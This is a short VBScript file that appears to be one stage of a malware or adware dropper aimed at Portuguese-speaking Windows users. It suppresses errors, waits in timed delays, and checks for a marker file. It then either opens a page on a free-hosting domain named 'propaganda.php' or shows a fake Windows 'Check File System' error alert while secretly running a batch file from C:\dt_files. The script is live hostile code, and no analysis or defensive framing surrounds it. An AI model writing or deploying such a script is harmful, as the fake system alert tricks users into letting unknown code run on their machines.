On Error Resume Next
Function FileExists(FilePath)
  Set fso = CreateObject("Scripting.FileSystemObject")
  If fso.FileExists(FilePath) Then
    FileExists=CBool(1)
  Else
    FileExists=CBool(0)
  End If
End Function

WScript.Sleep 30000

If FileExists("c:\dt_files\inst.txt") Then
  WScript.Sleep 90000
  Dim WscriptSchell
  Set WscriptSchell = CreateObject("WScript.Shell")
  WscriptSchell.Run "http://novotempo.infinityfreeapp.com/propaganda.php", 9			
Else
  MsgBox "O Windows encontrou falhas no sistema de arquivos e necessita iniciar uma varredura para corrigir os erros.", 16, "Check File System" 
  Function Execute()
    dim shell
    set shell=createobject("wscript.shell")
    shell.run "C:\dt_files\start.bat"
    set shell=nothing
  End Function
  Execute()
End If
